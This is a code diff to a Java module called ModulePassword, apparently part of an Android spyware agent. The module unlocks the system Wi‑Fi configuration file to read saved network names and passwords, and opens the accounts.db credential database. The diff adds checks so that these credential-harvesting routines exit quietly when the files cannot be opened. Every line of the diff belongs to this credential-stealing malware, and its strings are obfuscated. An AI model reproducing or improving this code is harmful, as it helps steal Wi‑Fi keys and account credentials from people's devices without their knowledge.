@@ -111,12 +111,17 @@ public class ModulePassword extends BaseModule {
 
 		dumpWifi();
 		dumpAccounts(passwordVisitor);
-		
+
 	}
 
 	private void dumpWifi() {
 		String filename = M.e("/data/misc/wifi/wpa_supplicant.conf");
-		Path.unprotect(filename, 2, false);
+		if (!Path.unprotect(filename, 2, false)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpWifi) no passwords found");
+			}
+			return;
+		}
 		List<String> lines = StringUtils.readFileLines(filename);
 		String ssid = "";
 		String psk = "";
@@ -125,7 +130,7 @@ public class ModulePassword extends BaseModule {
 			if (line.contains("ssid")) {
 				ssid = getValue(line);
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (dumpWifi) ssid = %s",ssid);
+					Check.log(TAG + " (dumpWifi) ssid = %s", ssid);
 				}
 			} else if (line.contains("psk")) {
 				psk = getValue(line);
@@ -156,6 +161,13 @@ public class ModulePassword extends BaseModule {
 		String file = M.e("accounts.db");
 
 		String dbFile = "";
+
+		if (!Path.unprotect(pathUser, 3, false)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpAccounts) error: cannot open path");
+			}
+			return;
+		}
 
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(pathSystem, file);
 		if (helper == null) {
